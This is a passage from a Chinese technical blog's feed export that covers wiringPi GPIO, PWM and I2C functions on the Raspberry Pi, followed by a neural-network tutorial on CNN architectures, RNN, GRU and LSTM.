上输出 PWM 信号。 但是也有一些限制。为了维护较低的 CPU 使用率，最小的脉冲宽度是 100 微秒，结合默认的建议值为 100，那么最小的 PWM 频率是 100Hz。如果需要更高的频率，可以使用更低的数值。如果看脉冲宽度的驱动代码，你会发现低于 100 微秒，wiringPi 是在软件循环中实现的，这就意味着 CPU 使用率将会动态增加，从而使得控制其他管脚成为不可能。 需要注意的是，当其他程序运行在更高的实时的优先级，Linux 可能会影响产生信号的精度。尽管有这些限制，控制 LED 或电机还是可以的。 使用前,需要包含相应的文件:12#include &lt;wiringPi.h&gt;#include &lt;softPwm.h&gt; 当编译程序时,必须加上 pthread 库,如下:1gcc –o myprog myprog.c –lwiringPi –lpthread 必须使用 wiringPiSetup()、 wiringPiSetupGpio()或者 wiringPiSetupPhys()函数来初始化 wiringPi。 wiringPiSetupSys()是不够快的，因此，必须使用 sudo 命令来运行程序。 softPwmCreate 函数该函数的原型为：int softPwmCreate(int pin, int initialValue, int pwmRange); 该函数将会创建一个软件控制的 PWM 管脚。可以使用任何一个 GPIO 管脚 , pwmRange 参数可以为 0(关)~100(全开)。 返回值为 0，代表成功，其他值，代表失败。 softPwmWrite 函数该函数的原型为: void softPwmWrite(int pin, int value); 该函数将会更新指定管脚的 PWM 值。value 参数的范围将会被检查,如果指定的管脚之前没有通过 softPwmCreate 初始化,将会被忽略。 wiringPi核心函数pinMode函数该函数的原型为: void pinMode(int pin, int mode); 使用该函数可以将某个管脚讴置为 INPUT(输入)、 OUTPUT(输出)、 PWM_OUTPUT(脉冲输出)或者 GPIO_CLOCK(GPIO 时钟)。 需要注意的是仅有管脚 1(BCM_GPIO 18)支持 PWM_OUTPUT 模式,仅有管脚 7(BCM_GPIO 4)支持 CLOCK 输出模式。 在 Sys 模式下,返个函数没有影响。你可以通过调用 gpio 命令在 shell 脚本中来设置管脚的模式。 digitalWrite 函数该函数的原型为: void digitalWrite(int pin, int value); 使用该函数可以向指定的管脚写入 HIGH(高)或者 LOW(低),写入前,需要将管脚设置为输出模式。 wiringPi 将任何的非 0 值作为 HIGH (高)来对待,因此, 0 是唯一能够代表 LOW (低)的数值。 digitalRead 函数该函数原型： digitalRead(int pin); 使用该函数可以读取指定管脚的值，读取到的值为HIGH（1）或者LOW（0），该值取决于该管脚的逻辑电平的高低。 时间函数delay 函数该函数的原型为：void delay(unsigned int howLong); 该函数将会中断程序执行至少 howLong 毫秒。因为 Linux 是多任务的原因，中断时间可能会更长。需要注意的是，最长的延迟值是一个无符号 32 位整数，其大约为 49 天。 delayMicroseconds 函数该函数的原型为：void delayMicroseconds(unsigned int howLong); 该函数将会中断程序执行至少 howLong 微秒。因为 Linux 是一个多任务的系统，因此中断时间可能会更长。需要注意的是，最长的延迟值是一个无符号 32 位整数，其大约为 71分钟。 延迟低于100 微秒，将会使用硬件循环来实现；超过 100 微秒，将会使用系统的nanosleep()函数来实现。 优先级/时间/线程wiringPiISR 函数该函数的原型为：int wiringPiISR(int pin, int edgeType, void (*function)(void)); 该函数会在指定管脚注册一个中断事件的函数，当指定管脚发生中断事件时，会自动调用该函数。 edgeType 参数可以为 INT_EDGE_FALLING（下降沿）、INT_EDGE_RISING（上升沿）、INT_EDGE_BOTH（上升沿或者下降沿）或者 INT_EDGE_SETUP。如果是INT_EDGE_SETUP，将不会初始化该管脚，因为它假定已经在别处设置过该管脚（比如使用 gpio 命令），但是，如果指定另外的类型，指定管脚将会被导出并初始化。完成此操作使用的是 gpio 命令，所以，必须保证 gpio 命令是可用的。 注册函数在中断触发时，将会被调用。在调用注册函数前，中断事件将会从分配器中清除，所以，即使有后续的触发发生，在处理完成前，也不会错过此次触发。（当然，如果在正在处理触发时，有不止一个的中断发生，已经发生的中断将会被忽略）。 I2C库wiringPi 包含了一个 I2C 库，来让您能够更轻松的使用树莓派的板上 I2C 接口。在使用 I2C 接口之前，您可能需要使用 gpio 命令来加载 I2C 驱劢到内核中：1gpio load i2c 如果你需要的波特率是 100Kbps，那么您可以使用如下命令设置波特率为1000Kbps：1gpio load i2c 1000 使用 I2C 库，需要包含 wiringPiI2C.h 文件。并且编译时，同样需要使用-lwiringPi 来连接到 wiringPi 库。 您仍然可以使用标准的系统命令来检测 I2C 设备，如 i2cdetect 命令，需要注意的是，在 v1 版本的树莓派上是 0，v2 版本上是 1，如下： 123ls /dev/i2c-1# 注意i2c-1后面的编码1i2cdetect –y 1 当然，您也可以使用 gpio 命令来调用 i2cdetect 命令，从而检测 I2C 讴备，返样就不用在乎您的树莓派版本了，如下：1gpio i2cdetect wiringPiI2CSetup 函数该函数的原型为：int wiringPiI2CSetup(int devId); 该函数使用指定设备标示号来初始化 I2C 系统。参数 devId 是 I2C 设备的地址，可以通过 i2cdetect 命令可以查到该地址。该函数会获取树莓派的版本并依据此打开/dev 目录下对应的讴备。 返回值是标准的 Linux 文件句柄，如果有错误，则返回-1。 比如，流行的 MCP23017 GPIO 扩展器的设备 ID 是 0x20，所以，你需要将这个数值传递给 wiringPiI2CSetup()。 wiringPiI2CWrite 函数该函数的原型为：int wiringPiI2CWrite(int fd, int data)； 简单的设备写操作。一些设备可以接受数据，而不需要发送任何内部寄存器地址。 wiringPiI2CRead 函数该函数的原型为：int wiringPiI2CRead(int fd)； 简单的设备读操作。一些设备可以直接读取，而不需要发送任何寄存器地址。 wiringPiI2CWriteReg8 和 wiringPiI2CWriteReg16 函数该函数的原型为： int wiringPiI2CWriteReg8(int fd, int reg, int data); int wiringPiI2CWriteReg16(int fd, int reg, int data); 使用返两个函数，可以写一个 8 位或 16 位数值到指定的设备寄存器。 wiringPiI2CReadReg8 和 wiringPiI2CReadReg16 函数该函数的原型为： int wiringPiI2CReadReg8(int fd, int reg); int wiringPiI2CReadReg16(int fd, int reg); 使用返两个函数，可以从指定的设备寄存器读取一个 8 位或 16 位的数值。 参考链接 树莓派 wiringPi 用户手册 , by 科技爱好者博客 Wiring Pi Pthreads 入门教程,by hanbingyan.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[人工智能——人类科技再次飞跃的门槛]]></title>
    <url>%2F2018%2F11%2F21%2F%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E2%80%94%E2%80%94%E4%BA%BA%E7%B1%BB%E7%A7%91%E6%8A%80%E5%86%8D%E6%AC%A1%E9%A3%9E%E8%B7%83%E7%9A%84%E9%97%A8%E6%A7%9B%2F</url>
    <content type="text"><![CDATA[人工智能的研究历史有着一条从以“推理”为重点，到以“知识”为重点，再到以“学习”为重点的自然、清晰的脉络。机器学习则是实现人工智能的一个途径，即以机器学习为手段解决人工智能中的问题。 问题的提出问题的分析解决方案总结参考文献 机器学习, by wikipedia.]]></content>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习之神经网络]]></title>
    <url>%2F2018%2F11%2F20%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%2F</url>
    <content type="text"><![CDATA[人工神经网络（英语：Artificial Neural Network，ANN），简称神经网络（Neural Network，NN）或类神经网络，在机器学习和认知科学领域，是一种模仿生物神经网络（动物的中枢神经系统，特别是大脑）的结构和功能的数学模型或计算模型，用于对函数进行估计或近似。 神经网络由大量的人工神经元联结进行计算。大多数情况下人工神经网络能在外界信息的基础上改变内部结构，是一种自适应系统，通俗的讲就是具备学习功能。现代神经网络是一种非线性统计性数据建模工具。 神经元神经元示意图： 图1 神经元示意图 a1~an为输入向量的各个分量 w1~wn为神经元各个突触的权值 b为偏置 f为传递函数，通常为非线性函数。一般有Sigmoid(), ReLU(), Softmax()。 t为神经元输出 神经元的数学表示是：$t=f(\vec{W^{‘}}\vec{A}+b)$ $\vec{W}$为权向量，$\vec{W^{‘}}$为$\vec{W}$的转置 $\vec{A}$为输入向量 $b$为偏置 $f$为传递函数 可见，一个神经元的功能是求得输入向量与权向量的内积后，经一个非线性传递函数得到一个标量结果。 激活函数 Sigmoid函数 Sigmoid函数也称S型激活函数，其将加权和转换为介于 0 和 1 之间的值。 F(x)=\frac{1} {1+e^{-x}}曲线图如下： 图2 S 型激活函数 ReLU函数 相较于 S 型函数等平滑函数，以下修正线性单元激活函数（简称为 ReLU）的效果通常要好一点，同时还非常易于计算。 F(x)=max(0,x)ReLU 的优势在于它基于实证发现（可能由 ReLU 驱动），拥有更实用的响应范围。S 型函数的响应性在两端相对较快地减少。 图3 ReLU 激活函数 Softmax函数 Softmax函数用于多类别神经网络。在多类别问题中，Softmax 会为每个类别分配一个用小数表示的概率。这些用小数表示的概率相加之和必须是 1.0。 Softmax 方程式如下所示： p(y = j|\textbf{x}) = \frac{e^{(\textbf{w}_j^{T}\textbf{x} + b_j)}}{\sum_{k\in K} {e^{(\textbf{w}_k^{T}\textbf{x} + b_k)}} }请注意，此公式本质上是将逻辑回归公式延伸到了多类别。 Softmax 层是紧挨着输出层之前的神经网络层。Softmax 层必须和输出层拥有一样的节点数。 图4 神经网络中的 Softmax 层 神经元网络神经元网络可分为单层神经元网络和多层神经元网络。而常用的是多层神经元网络。 多层神经元网络一种常见的多层结构的前馈网络（Multilayer Feedforward Network）由三部分组成，如图2所示： 图5 包含激活函数的三层模型的图表 输入层（Input layer），众多神经元（Neuron）接受大量非线形输入消息。输入的消息称为输入向量。 输出层（Output layer），消息在神经元链接中传输、分析、权衡，形成输出结果。输出的消息称为输出向量。 隐藏层（Hidden layer），简称“隐层”，是输入层和输出层之间众多神经元和链接组成的各个层面。隐层可以有一层或多层。隐层的节点（神经元）数目不定，但数目越多神经网络的非线性越显著，从而神经网络的强健性（robustness）（控制系统在一定结构、大小等的参数摄动下，维持某些性能的特性）更显著。习惯上会选输入节点1.2至1.5倍的节点。 这种网络一般称为感知器（对单隐藏层）或多层感知器（对多隐藏层），神经网络的类型已经演变出很多种，这种分层的结构也并不是对所有的神经网络都适用。 训练神经网络通常使用反向传播算法训练神经网络[3]，但一些常见情况都会导致反向传播算法出错。 梯度消失 较低层（更接近输入）的梯度可能会变得非常小。在深度网络中，计算这些梯度时，可能涉及许多小项的乘积。 当较低层的梯度逐渐消失到 0 时，这些层的训练速度会非常缓慢，甚至不再训练。 ReLU 激活函数有助于防止梯度消失。 梯度爆炸 如果网络中的权重过大，则较低层的梯度会涉及许多大项的乘积。在这种情况下，梯度就会爆炸：梯度过大导致难以收敛。 批标准化可以降低学习速率，因而有助于防止梯度爆炸。 ReLU 单元消失 一旦 ReLU 单元的加权和低于 0，ReLU 单元就可能会停滞。它会输出对网络输出没有任何贡献的 0 激活，而梯度在反向传播算法期间将无法再从中流过。由于梯度的来源被切断，ReLU 的输入可能无法作出足够的改变来使加权和恢复到 0 以上。 降低学习速率有助于防止 ReLU 单元消失。 丢弃正则化 这是称为丢弃的另一种形式的正则化，可用于神经网络。其工作原理是，在梯度下降法的每一步中随机丢弃一些网络单元。丢弃得越多，正则化效果就越强。 卷积神经网络卷积神经⽹络（convolutional neural network）是含有卷积层（convolutional layer）的神经⽹络。下面将按时间顺序介绍各类经典的卷积神经网络。 卷积神经⽹络（LeNet）LeNet是⼀个早期⽤来识别⼿写数字图像的卷积神经⽹络，于80 年代末期提出。这个名字来源于LeNet论⽂的第⼀作者Yann LeCun。LeNet展⽰了通过梯度下降训练卷积神经⽹络可以达到⼿写数字识别在当时最先进的结果。这个奠基性的⼯作第⼀次将卷积神经⽹络推上舞台，为世⼈所知。 LeNet结构LeNet一共有7层（不包括输入层），可分为卷积层块和全连接层块两个部分，如图6所示。 图6 LeNet结构 输入层：输入图像的大小为32*32，这要比mnist数据库中的最大字母（28*28）还大。作用： 图像较大，这样做的目的是希望潜在的明显特征，比如笔画断续，角点等能够出现在最高层特征监测子感受野的中心。 卷积层：C1，C3，C5为卷积层，S2，S4为降采样层。 全连接层：F6为全连接层，还有一个输出层。 深度卷积神经⽹络（AlexNet）2012年，AlexNet横空出世。这个模型的名字来源于论⽂第⼀作者的姓名Alex Krizhevsky。AlexNet使⽤了8层卷积神经⽹络，并以很⼤的优势赢得了ImageNet 2012图像识别挑战赛。它⾸次证明了学习到的特征可以超越⼿⼯设计的特征，从而⼀举打破计算机视觉研究的前状。 AlexNet与LeNet区别AlexNet与LeNet的设计理念⾮常相似，但也有显著的区别。 第⼀，与相对较小的LeNet相⽐，AlexNet包含8层变换，其中有5层卷积和2层全连接隐藏层，以及1个全连接输出层。 第⼆，AlexNet将sigmoid激活函数改成了更加简单的ReLU激活函数。 第三，AlexNet通过丢弃法来控制全连接层的模型复杂度。 第四，AlexNet引⼊了⼤量的图像增⼴，如翻转、裁剪和颜⾊变化，从而进⼀步扩⼤数据集来缓解过拟合。 AlexNet结构AlexNet的一些参数和结构图： 卷积层：5层 全连接层：3层 深度：8层 参数个数：60M 神经元个数：650k 分类数目：1000类 图7 AlexNet结构 由于当时的显卡容量问题，AlexNet 的60M个参数无法全部放在一张显卡上操作，所以采用了两张显卡分开操作的形式，其中在C3，R1，R2，R3层上出现交互，所谓的交互就是通道的合并，是一种串接操作。 使⽤重复元素的⽹络（VGG网络）VGG的名字来源于论⽂作者所在的实验室Visual Geometry Group。2014年VGG提出了可以通过重复使⽤简单的基础块来构建深度模型的思路。 VGG块的组成规律是：连续使⽤数个相同的填充为1、窗口形状为3*3的卷积层后接上⼀个步幅为2、窗口形状为2*2的最⼤池化层。卷积层保持输⼊的⾼和宽不变，而池化层则对其减半。 VGG相比AlexNet的一个改进是采用连续的几个3x3的卷积核代替AlexNet中的较大卷积核（11x11，7x7，5x5）。对于给定的感受野（与输出有关的输入图片的局部大小），采用堆积的小卷积核是优于采用大的卷积核，因为多层非线性层可以增加网络深度来保证学习更复杂的模式，而且代价还比较小（参数更少）。 与AlexNet和LeNet⼀样，VGG⽹络由卷积层模块后接全连接层模块构成。卷积层模块串联数个vgg_block，其超参数由变量conv_arch定义。该变量指定了每个VGG块⾥卷积层个数和输出通道数。全连接模块则跟AlexNet中的⼀样。 构造⼀个最简单的VGG⽹络VGG-11。它有5个卷积块，前2块使⽤单卷积层，而后3块使⽤双卷积层。第⼀块的输出通道是64，之后每次对输出通道数翻倍，直到变为512。 图8 VGG结构 ⽹络中的⽹络（NiN）在AlexNet问世不久，⽹络中的⽹络（NiN）提出即串联多个由卷积层和“全连接”层构成的小⽹络来构建⼀个深层⽹络。 卷积层的输⼊和输出通常是四维数组（样本，通道，⾼，宽），而全连接层的输⼊和输出则通常是⼆维数组（样本，特征）。如果想在全连接层后再接上卷积层，则需要将全连接层的输出变换为四维。1*1卷积层可以看成全连接层中空间维度（⾼和宽）上的每个元素相当于样本，通道相当于特征。因此， NiN使⽤1*1卷积层来替代全连接层，从而使空间信息能够⾃然传递到后⾯的层中去。 NiN结构（右边）与AlexNet、VGG（左边）的区别： 图9 NiN与VGG区别 NiN块是NiN中的基础块。它由⼀个卷积层加两个充当全连接层的1 * 1卷积层串联而成。其中第⼀个卷积层的超参数可以⾃⾏设置，而第⼆和第三个卷积层的超参数⼀般是固定的。 NiN重复使⽤由卷积层和代替全连接层的1 * 1卷积层构成的NiN块来构建深层⽹络。NiN去除了容易造成过拟合的全连接输出层，而是将其替换成输出通道数等于标签类别数的NiN块和全局平均池化层。 含并⾏连结的⽹络（GoogLeNet）在2014年的ImageNet图像识别挑战赛中，⼀个名叫GoogLeNet的⽹络结构⼤放异彩。它虽然在名字上向LeNet致敬，但在⽹络结构上已经很难看到LeNet的影⼦。GoogLeNet吸收了NiN中⽹络串联⽹络的思想，并在此基础上做了很⼤改进。 GoogLeNet中的基础卷积块叫作Inception块，得名于同名电影《盗梦空间》（Inception）。与NiN块相⽐，这个基础块在结构上更加复杂，如图所⽰。 图10 Inception块结构 Inception块⾥有4条并⾏的线路。前3条线路使⽤窗口⼤小分别是1 * 1、3 * 3和5 * 5的卷积层来抽取不同空间尺⼨下的信息，其中中间2个线路会对输⼊先做1 * 1卷积来减少输⼊通道数，以降低模型复杂度。第四条线路则使⽤3*3最⼤池化层，后接1*1卷积层来改变通道数。4条线路都使⽤了合适的填充来使输⼊与输出的⾼和宽⼀致。最后我们将每条线路的输出在通道维上连结，并输⼊接下来的层中去。 Inception块中可以⾃定义的超参数是每个层的输出通道数，以此来控制模型复杂度。 GoogLeNet跟VGG⼀样，在主体卷积部分中使⽤5个模块（block），每个模块之间使⽤步幅为2的3*3最⼤池化层来减小输出⾼宽。 残差网络（ResNet）让我们先思考一个问题：对神经网络模型添加新的层，充分训练后的模型是否只可能更有效地降低训练误差？理论上，原模型解的空间只是新模型解的空间的子空间。也就是说，如果我们能将新添加的层训练成恒等映射 f(x)=x ，新模型和原模型将同样有效。由于新模型可能得出更优的解来拟合训练数据集，因此添加层似乎更容易降低训练误差。然而在实践中，添加过多的层后训练误差往往不降反升。即使利用批量归一化带来的数值稳定性使训练深层模型更加容易，该问题仍然存在。针对这一问题，何恺明等人提出了残差网络（ResNet）。它在2015年的ImageNet图像识别挑战赛夺魁，并深刻影响了后来的深度神经网络的设计。 让我们聚焦于神经网络局部。如图11所示，设输入为 x 。假设我们希望学出的理想映射为 f(x) ，从而作为图11上方激活函数的输入。左图虚线框中的部分需要直接拟合出该映射 f(x) ，而右图虚线框中的部分则需要拟合出有关恒等映射的残差映射 f(x)−x 。残差映射在实际中往往更容易优化。以本节开头提到的恒等映射作为我们希望学出的理想映射 f(x) 。我们只需将图11中右图虚线框内上方的加权运算（如仿射）的权重和偏差参数学成0，那么 f(x) 即为恒等映射。实际中，当理想映射 f(x) 极接近于恒等映射时，残差映射也易于捕捉恒等映射的细微波动。图11右图也是ResNet的基础块，即残差块（residual block）。在残差块中，输入可通过跨层的数据线路更快地向前传播。 图11 ResNet残差块结构 ResNet沿用了VGG全 3×3 卷积层的设计。残差块里首先有2个有相同输出通道数的 3×3 卷积层。每个卷积层后接一个批量归一化层和ReLU激活函数。然后我们将输入跳过这两个卷积运算后直接加在最后的ReLU激活函数前。这样的设计要求两个卷积层的输出与输入形状一样，从而可以相加。如果想改变通道数，就需要引入一个额外的 1×1 卷积层来将输入变换成需要的形状后再做相加运算。 稠密连接网络（DenseNet）稠密连接网络（DenseNet）与ResNet的主要区别如图12所示。 图12 ResNet（左）与DenseNet（右）在跨层连接上的主要区别：使用相加和使用连结 图12中将部分前后相邻的运算抽象为模块A和模块B。与ResNet的主要区别在于，DenseNet里模块B的输出不是像ResNet那样和模块A的输出相加，而是在通道维上连结。这样模块A的输出可以直接传入模块B后面的层。在这个设计里，模块A直接跟模块B后面的所有层连接在了一起。这也是它被称为“稠密连接”的原因。 DenseNet的主要构建模块是稠密块（dense block）和过渡层（transition layer）。前者定义了输入和输出是如何连结的，后者则用来控制通道数，使之不过大。 MobileNets：同样的卷积层，更少的参数MobileNet，正如其名，这是一个非常简单快速并且准确率也不错的CNN网络结构，它大大减少了网络层的参数数量，使得网络的前向传播和后向传播的运算量大幅减少，最终成为了一个效率极高的CNN网络。 ShuffleNets：Group convolution+Channel ShuffleShuffleNet是Face++提出的一种轻量化网络结构，主要思路是使用Group convolution和Channel shuffle改进ResNet，可以看作是ResNet的压缩版本。 循环神经网络循环神经网络是为更好地处理时序信息而设计的。它引入状态变量来存储过去的信息，并用其与当前的输入共同决定当前的输出。 循环神经网络常用于处理序列数据，如一段文字或声音、购物或观影的顺序，甚至是图像中的一行或一列像素。因此，循环神经网络有着极为广泛的实际应用，如语言模型、文本分类、机器翻译、语音识别、图像分析、手写识别和推荐系统。 现在我们考虑输入数据存在时间相关性的情况。假设 $Xt∈R^{n×d}$ 是序列中时间步 $t$ 的小批量输入，$H_t∈R^{n×h}$ 是该时间步的隐藏变量。与多层感知机不同的是，这里我们保存上一时间步的隐藏变量 $H{t−1}$ ，并引入一个新的权重参数 $W_{hh}∈R^{h×h}$ ，该参数用来描述在当前时间步如何使用上一时间步的隐藏变量。具体来说，时间步 $t$ 的隐藏变量的计算由当前时间步的输入和上一时间步的隐藏变量共同决定： H_t=ϕ(X_tW_{xh}+H_{t−1}W_{hh}+b_h)与多层感知机相比，我们在这里添加了 $H{t−1}W{hh}$一项。由上式中相邻时间步的隐藏变量 $Ht$ 和 $H{t−1}$ 之间的关系可知，这里的隐藏变量能够捕捉截至当前时间步的序列的历史信息，就像是神经网络当前时间步的状态或记忆一样。因此，该隐藏变量也称为隐藏状态。由于隐藏状态在当前时间步的定义使用了上一时间步的隐藏状态，上式的计算是循环的。使用循环计算的网络即循环神经网络（recurrent neural network）。 循环神经网络有很多种不同的构造方法。含上式所定义的隐藏状态的循环神经网络是极为常见的一种。若无特别说明，本章中的循环神经网络均基于上式中隐藏状态的循环计算。在时间步 $t$ ，输出层的输出和多层感知机中的计算类似： O_t=H_tW_{hq}+b_q循环神经网络的参数包括隐藏层的权重 $W{xh}∈R^{d×h}$ 、 $W{hh}∈R^{h×h}$ 和偏差 $bh∈R^{1×h}$ ，以及输出层的权重 $W{hq}∈R^{h×q}$ 和偏差 $b_q∈R^{1×q}$ 。值得一提的是，即便在不同时间步，循环神经网络也始终使用这些模型参数。因此，循环神经网络模型参数的数量不随时间步的增加而增长。 图13展示了循环神经网络在3个相邻时间步的计算逻辑。在时间步 $t$ ，隐藏状态的计算可以看成是将输入 $Xt$ 和前一时间步隐藏状态 $H{t−1}$ 连结后输入一个激活函数为 $ϕ$ 的全连接层。该全连接层的输出就是当前时间步的隐藏状态 $Ht$ ，且模型参数为 $W{xh}$ 与 $W{hh}$ 的连结，偏差为 $b_h$ 。当前时间步 $t$ 的隐藏状态 $H_t$ 将参与下一个时间步 $t+1$ 的隐藏状态 $H{t+1}$ 的计算，并输入到当前时间步的全连接输出层。 图13 含隐藏状态的循环神经网络 门控循环单元（GRU）当时间步数较大或者时间步较小时，循环神经网络的梯度较容易出现衰减或爆炸。虽然裁剪梯度可以应对梯度爆炸，但无法解决梯度衰减的问题。通常由于这个原因，循环神经网络在实际中较难捕捉时间序列中时间步距离较大的依赖关系。 门控循环神经网络（gated recurrent neural network）的提出，正是为了更好地捕捉时间序列中时间步距离较大的依赖关系。它通过可以学习的门来控制信息的流动。其中，门控循环单元（gated recurrent unit，GRU）是一种常用的门控循环神经网络。 门控循环单元引入了重置门（reset gate）和更新门（update gate）的概念，从而修改了循环神经网络中隐藏状态的计算方式。门控循环单元中的重置门和更新门的输入均为当前时间步输入 $Xt$ 与上一时间步隐藏状态 $H{t−1}$ ，输出由激活函数为sigmoid函数的全连接层计算得到。 图14 门控循环单元中候选隐藏状态的计算 具体来说，时间步 $t$ 的候选隐藏状态 $\tilde{\boldsymbol{H}}_t∈R^{n×h}$ 的计算为 \tilde{\boldsymbol{H}}_t=tanh(X_tW_{xh}+(R_t⊙H_{t−1})W_{hh}+b_h)其中 $W{xh}∈R^{d×h}$ 和 $W{hh}∈R^{h×h}$ 是权重参数， $b_h∈R^{1×h}$ 是偏差参数。从上面这个公式可以看出，重置门控制了上一时间步的隐藏状态如何流入当前时间步的候选隐藏状态。而上一时间步的隐藏状态可能包含了时间序列截至上一时间步的全部历史信息。因此，重置门可以用来丢弃与预测无关的历史信息。 最后，时间步 $t$ 的隐藏状态 $Ht∈R^{n×h}$ 的计算使用当前时间步的更新门 $Z_t$ 来对上一时间步的隐藏状态 $H{t−1}$ 和当前时间步的候选隐藏状态 $\tilde{\boldsymbol{H}}_t$ 做组合： Ht=Zt⊙Ht−1+(1−Zt)⊙\tilde{\boldsymbol{H}}_t 图15 门控循环单元中隐藏状态的计算 值得注意的是，更新门可以控制隐藏状态应该如何被包含当前时间步信息的候选隐藏状态所更新。 我们对门控循环单元的设计稍作总结： 重置门有助于捕捉时间序列里短期的依赖关系； 更新门有助于捕捉时间序列里长期的依赖关系。 长短期记忆（LSTM）LSTM 中引入了3个门，即输入门（input gate）、遗忘门（forget gate）和输出门（output gate），以及与隐藏状态形状相同的记忆细胞（某些文献把记忆细胞当成一种特殊的隐藏状态），从而记录额外的信息。 输入门、遗忘门和输出门与门控循环单元中的重置门和更新门一样，如图16所示，长短期记忆的门的输入均为当前时间步输入 $Xt$ 与上一时间步隐藏状态 $H{t−1}$ ，输出由激活函数为sigmoid函数的全连接层计算得到。如此一来，这3个门元素的值域均为 [0,1] 。 图16 长短期记忆中输入门、遗忘门和输出门的计算 具体来说，假设隐藏单元个数为$h$，给定时间步$t$的小批量输入$\boldsymbol{X}t \in \mathbb{R}^{n \times d}$（样本数为$n$，输入个数为$d$）和上一时间步隐藏状态$\boldsymbol{H}_{t-1} \in \mathbb{R}^{n \times h}$。 时间步$t$的输入门$\boldsymbol{I}_t \in \mathbb{R}^{n \times h}$、遗忘门$\boldsymbol{F}_t \in \mathbb{R}^{n \times h}$和输出门$\boldsymbol{O}_t \in \mathbb{R}^{n \times h}$分别计算如下： \begin{aligned} \boldsymbol{I}_t &= \sigma(\boldsymbol{X}_t \boldsymbol{W}_{xi} + \boldsymbol{H}_{t-1} \boldsymbol{W}_{hi} + \boldsymbol{b}_i)\end{aligned}\begin{aligned} \boldsymbol{F}_t &= \sigma(\boldsymbol{X}_t \boldsymbol{W}_{xf} + \boldsymbol{H}_{t-1} \boldsymbol{W}_{hf} + \boldsymbol{b}_f)\end{aligned}\begin{aligned} \boldsymbol{O}_t &= \sigma(\boldsymbol{X}_t \boldsymbol{W}_{xo} + \boldsymbol{H}_{t-1} \boldsymbol{W}_{ho} + \boldsymbol{b}_o)\end{aligned}其中的$\boldsymbol{W}{xi}, \boldsymbol{W}{xf}, \boldsymbol{W}{xo} \in \mathbb{R}^{d \times h}$和$\boldsymbol{W}{hi}, \boldsymbol{W}{hf}, \boldsymbol{W}{ho} \in \mathbb{R}^{h \times h}$是权重参数，$\boldsymbol{b}_i, \boldsymbol{b}_f, \boldsymbol{b}_o \in \mathbb{R}^{1 \times h}$是偏差参数。 候选记忆细胞接下来，长短期记忆需要计算候选记忆细胞$\tilde{\boldsymbol{C}}_t$。它的计算与上面介绍的3个门类似，但使用了值域在$[-1, 1]$的tanh函数作为激活函数，如图17所示。 图17 长短期记忆中候选记忆细胞的计算 具体来说，时间步$t$的候选记忆细胞$\tilde{\boldsymbol{C}}_t \in \mathbb{R}^{n \times h}$的计算为 \tilde{\boldsymbol{C}}t = \text{tanh}(\boldsymbol{X}t \boldsymbol{W}{xc} + \boldsymbol{H}{t-1} \boldsymbol{W}_{hc} + \boldsymbol{b}_c),其中$\boldsymbol{W}{xc} \in \mathbb{R}^{d \times h}$和$\boldsymbol{W}{hc} \in \mathbb{R}^{h \times h}$是权重参数，$\boldsymbol{b}_c \in \mathbb{R}^{1 \times h}$是偏差参数。 记忆细胞我们可以通过元素值域在$[0, 1]$的输入门、遗忘门和输出门来控制隐藏状态中信息的流动，这一般也是通过使用按元素乘法（符号为$\odot$）来实现的。当前时间步记忆细胞$\boldsymbol{C}_t \in \mathbb{R}^{n \times h}$的计算组合了上一时间步记忆细胞和当前时间步候选记忆细胞的信息，并通过遗忘门和输入门来控制信息的流动： \boldsymbol{C}_t = \boldsymbol{F}t \odot \boldsymbol{C}{t-1} + \boldsymbol{I}_t \odot \tilde{\boldsymbol{C}}_t.如图6.9所示，遗忘门控制上一时间步的记忆细胞$\boldsymbol{C}_{t-1}$中的信息是否传递到当前时间步，而输入门则控制当前时间步的输入$\boldsymbol{X}_t$通过候选记忆细胞$\tilde{\boldsymbol{C}}_t$如何流入当前时间步的记忆细胞。如果遗忘门一直近似1且输入门一直近似0，过去的记忆细胞将一直通过时间保存并传递至当前时间步。这个设计可以应对循环神经网络中的梯度衰减问题，并更好地捕捉时间序列中时间步距离较大的依赖关系。 图18 长短期记忆中候选记忆细胞的计算 隐藏状态有了记忆细胞以后，接下来我们还可以通过输出门来控制从记忆细胞到隐藏状态$\boldsymbol{H}_t \in \mathbb{R}^{n \times h}$的信息的流动： \boldsymbol{H}_t = \boldsymbol{O}_t \odot \text{tanh}(\boldsymbol{C}_t).这里的tanh函数确保隐藏状态元素值在-1到1之间。需要注意的是，当输出门近似1时，记忆细胞信息将传递到隐藏状态供输出层使用；当输出门近似0时，记忆细胞信息只自己保留。图6.10展示了长短期记忆中隐藏状态的计算。 图19 长短期记忆中隐藏状态的计算 深度循环神经网络在深度学习应用里，我们通常会用到含有多个隐藏层的循环神经网络，也称作深度循环神经网络。图20演示了一个有 L 个隐藏层的深度循环神经网络，每个隐藏状态不断传递至当前层的下一时间步和当前时间步的下一层。 图20 深度循环神经网络的架构 具体来说，在时间步$t$里，设小批量输入$\boldsymbol{X}_t \in \mathbb{R}^{n \times d}$（样本数为$n$，输入个数为$d$），第$\ell$隐藏层（$\ell=1,\ldots,L$）的隐藏状态为$\boldsymbol{H}_t^{(\ell)} \in \mathbb{R}^{n \times h}$（隐藏单元个数为$h$），输出层变量为$\boldsymbol{O}_t \in \mathbb{R}^{n \times q}$（输出个数为$q$），且隐藏层的激活函数为$\phi$。第1隐藏层的隐藏状态和之前的计算一样： \boldsymbol{H}_t^{(1)} = \phi(\boldsymbol{X}_t \boldsymbol{W}_{xh}^{(1)} + \boldsymbol{H}_{t-1}^{(1)} \boldsymbol{W}_{hh}^{(1)} + \boldsymbol{b}_h^{(1)}),其中权重$\boldsymbol{W}{xh}^{(1)} \in \mathbb{R}^{d \times h}$、$\boldsymbol{W}{hh}^{(1)} \in \mathbb{R}^{h \times h}$和偏差 $\boldsymbol{b}_h^{(1)} \in \mathbb{R}^{1 \times h}$分别为第1隐藏层的模型参数。 当$1 &lt; \ell \leq L$时，第$\ell$隐藏层的隐藏状态的表达式为 \boldsymbol{H}_t^{(\ell)} = \phi(\boldsymbol{H}_t^{(\ell-1)} \boldsymbol{W}_{xh}^{(\ell)} + \boldsymbol{H}_{t-1}^{(\ell)} 